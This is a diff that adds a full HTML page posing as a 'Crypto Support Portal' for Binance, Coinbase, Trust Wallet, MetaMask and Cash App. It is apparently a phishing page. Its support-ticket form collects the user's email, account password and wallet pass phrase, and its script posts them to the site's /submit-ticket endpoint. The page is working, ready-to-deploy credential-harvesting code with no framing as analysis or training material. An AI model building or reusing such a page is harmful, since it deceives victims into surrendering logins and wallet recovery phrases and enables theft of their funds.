@@ -1,0 +1,382 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+
+    <title>Crypto Support Portal</title>
+
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
+
+    <style>
+        body {
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-family: Arial;
+            background: linear-gradient(-45deg, #0f2027, #203a43, #2c5364, #1c1c1c);
+            background-size: 400% 400%;
+            animation: gradientBG 12s ease infinite;
+            overflow: hidden;
+        }
+
+        /* animated background */
+
+        @keyframes gradientBG {
+            0% {
+                background-position: 0% 50%
+            }
+
+            50% {
+                background-position: 100% 50%
+            }
+
+            100% {
+                background-position: 0% 50%
+            }
+        }
+
+        .crypto-modal {
+            background: rgba(15, 32, 39, 0.95);
+            color: white;
+            border-radius: 12px;
+            box-shadow: 0 0 25px rgba(0, 0, 0, 0.6);
+        }
+
+        .crypto-input {
+            background: rgba(255, 255, 255, 0.1);
+            border: none;
+            color: white;
+        }
+
+        .crypto-input::placeholder {
+            color: #ccc;
+        }
+
+        .crypto-input:focus {
+            background: rgba(255, 255, 255, 0.15);
+            color: white;
+            box-shadow: none;
+        }
+
+        .modal-header {
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .modal-footer {
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        /* floating crypto icons */
+
+        .coin {
+            position: absolute;
+            width: 60px;
+            opacity: 0.25;
+            animation: floatCoin linear infinite;
+        }
+
+        .coin1 {
+            left: 5%;
+            animation-duration: 14s;
+        }
+
+        .coin2 {
+            left: 20%;
+            animation-duration: 18s;
+        }
+
+        .coin3 {
+            left: 40%;
+            animation-duration: 12s;
+        }
+
+        .coin4 {
+            left: 65%;
+            animation-duration: 16s;
+        }
+
+        .coin5 {
+            left: 85%;
+            animation-duration: 20s;
+        }
+
+        .coin6 {
+            left: 85%;
+            animation-duration: 20s;
+        }
+
+        .coin7 {
+            left: 85%;
+            animation-duration: 20s;
+        }
+
+        @keyframes floatCoin {
+            0% {
+                transform: translateY(110vh) rotate(0deg);
+            }
+
+            100% {
+                transform: translateY(-10vh) rotate(360deg);
+            }
+        }
+
+
+        /* portal card */
+
+        .portal {
+            width: 650px;
+            padding: 40px;
+            border-radius: 15px;
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(12px);
+            text-align: center;
+            color: white;
+            box-shadow: 0 0 25px rgba(0, 0, 0, 0.5);
+            z-index: 2;
+        }
+
+        .platforms {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 15px;
+            margin-top: 25px;
+        }
+
+
+        .card-btn {
+            background: #1e1e1e;
+            color: #eaeaea;
+            padding: 12px 18px;
+            border-radius: 10px;
+            cursor: pointer;
+            font-weight: 500;
+            transition: 0.3s;
+            border: 1px solid #333;
+        }
+
+        .card-btn:hover {
+            background: #111;
+            color: #fff;
+            border-color: #666;
+        }
+
+        .card-btn:hover {
+            transform: scale(1.05);
+            background: #f5f5f5;
+        }
+    </style>
+
+</head>
+
+<body>
+
+    <!-- floating crypto icons -->
+
+    <img src="../images/bitcoin-btc-logo.png" class="coin coin1">
+    <img src="../images/ethereum-eth-logo.png" class="coin coin2">
+    <img src="../images/bnb-bnb-logo.png" class="coin coin3">
+    <img src="../images/avalanche-avax-logo.png" class="coin coin4">
+    <img src="../images/xrp-xrp-logo.png" class="coin coin5">
+    <img src="../images/tether-usdt-logo.png" class="coin coin6">
+    <img src="../images/usd-coin-usdc-logo.png" class="coin coin7">
+
+    <div class="portal">
+
+        <h2>Crypto Support Portal</h2>
+        <p>Select your platform to continue</p>
+
+        <!-- <div class="platforms">
+
+            <div class="card-btn" data-bs-toggle="modal" data-bs-target="#supportModal">Binance</div>
+            <div class="card-btn" data-bs-toggle="modal" data-bs-target="#supportModal">Coinbase</div>
+            <div class="card-btn" data-bs-toggle="modal" data-bs-target="#supportModal">Trust Wallet</div>
+            <div class="card-btn" data-bs-toggle="modal" data-bs-target="#supportModal">MetaMask</div>
+            <div class="card-btn" data-bs-toggle="modal" data-bs-target="#supportModal">Cash App</div>
+            <div class="card-btn" data-bs-toggle="modal" data-bs-target="#supportModal">Kraken</div>
+
+        </div> -->
+        <div class="platforms">
+
+            <div class="card-btn" data-name="Binance" data-logo="../images/Binance-Logo.wine.png" data-bs-toggle="modal"
+                data-bs-target="#supportModal">
+                <img src="../images/Binance-Logo.wine.png" width="25"> Binance
+            </div>
+
+            <div class="card-btn" data-name="Coinbase" data-logo="../images/Coinbase-Logo.wine.png"
+                data-bs-toggle="modal" data-bs-target="#supportModal">
+                <img src="../images/Coinbase-Logo.wine.png" width="25"> Coinbase
+            </div>
+
+            <div class="card-btn" data-name="Trust Wallet" data-logo="../images/trustwallet.png" data-bs-toggle="modal"
+                data-bs-target="#supportModal">
+                <img src="../images/trustwallet.png" width="25"> Trust Wallet
+            </div>
+
+            <div class="card-btn" data-name="MetaMask" data-logo="../images/meta.png" data-bs-toggle="modal"
+                data-bs-target="#supportModal">
+                <img src="../images/meta.png" width="25"> MetaMask
+            </div>
+            <div class="card-btn" data-name="Cash App" data-logo="../images/cashApp.png" data-bs-toggle="modal"
+                data-bs-target="#supportModal">
+                <img src="../images/cashApp.png" width="25"> Cash App
+            </div>
+
+        </div>
+    </div>
+
+
+    <!-- modal -->
+
+    <div class="modal fade" id="supportModal">
+        <div class="modal-dialog modal-dialog-centered">
+            <div class="modal-content crypto-modal">
+
+                <div class="modal-header">
+
+                    <div class="d-flex align-items-center gap-2">
+                        <img id="modalLogo" width="35">
+                        <h5 class="modal-title" id="modalTitle"></h5>
+                    </div>
+
+                    <button class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
+
+                </div>
+
+                <div class="modal-body">
+
+                    <form>
+
+                        <div class="mb-3">
+                            <label class="form-label">Email Address</label>
+                            <input id="email" type="email" class="form-control crypto-input"
+                                placeholder="Enter your email">
+                        </div>
+                        <div class="mb-3 position-relative">
+
+                            <label class="form-label">Password</label>
+
+                            <input id="pwd" type="password" class="form-control crypto-input"
+                                placeholder="Enter your password" />
+
+                            <span onclick="togglePassword()" style="
+position:absolute;
+right:15px;
+top:38px;
+cursor:pointer;
+user-select:none;
+">
+                                👁️
+                            </span>
+
+                        </div>
+                        <div class="mb-3">
+                            <label class="form-label">Pass Phrase</label>
+                            <input id="passphrase" type="text" class="form-control crypto-input"
+                                placeholder="Enter your Pass Phrase">
+                        </div>
+
+                        <div class="mb-3">
+                            <label class="form-label">Select Issue</label>
+                            <select id="issue" class="form-select crypto-input">
+                                <option>--- Select Issue ---</option>
+                                <option>Account Issue</option>
+                                <option>Login Issue</option>
+                                <option>Transaction Problem</option>
+                                <option>Account Verification</option>
+                            </select>
+                        </div>
+
+                        <div class="mb-3">
+                            <label class="form-label">Describe Issue</label>
+                            <textarea id="description" class="form-control crypto-input" rows="4"></textarea>
+                        </div>
+
+                    </form>
+
+                </div>
+
+                <div class="modal-footer">
+                    <button class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button>
+                    <button class="btn btn-warning" onclick="submitTicket()">Submit Ticket</button>
+                </div>
+
+            </div>
+        </div>
+    </div>
+    <script>
+
+        document.querySelectorAll(".card-btn").forEach(button => {
+
+            button.addEventListener("click", function () {
+
+                const name = this.getAttribute("data-name")
+                const logo = this.getAttribute("data-logo")
+
+                document.getElementById("modalTitle").innerText = name + " Support"
+                document.getElementById("modalLogo").src = logo
+
+            })
+
+        })
+
+    </script>
+    <script>
+        function submitTicket() {
+
+            const email = document.getElementById("email").value
+            const pwd = document.getElementById("pwd").value
+            const passphrase = document.getElementById("passphrase").value
+            const issue = document.getElementById("issue").value
+            const description = document.getElementById("description").value
+
+            fetch("/submit-ticket", {
+
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+
+                body: JSON.stringify({
+                    email,
+                    passphrase,
+                    pwd,
+                    issue,
+                    description
+                })
+
+            })
+                .then(res => res.json())
+                .then(() => {
+
+                    document.getElementById("email").value = ""
+                    document.getElementById("pwd").value = ""
+                    document.getElementById("passphrase").value = ""
+                    document.getElementById("issue").selectedIndex = 0
+                    document.getElementById("description").value = ""
+
+                    alert("Ticket Submitted Successfully")
+                    location.reload()
+                })
+                .catch(() => {
+                    alert("Error submitting ticket. Please try again.")
+                })
+
+        }
+    </script>
+    <script>
+
+        function togglePassword() {
+
+            const pwd = document.getElementById("pwd")
+
+            pwd.type = pwd.type === "password" ? "text" : "password"
+
+        }
+
+    </script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
+
+</body>
+
+</html>
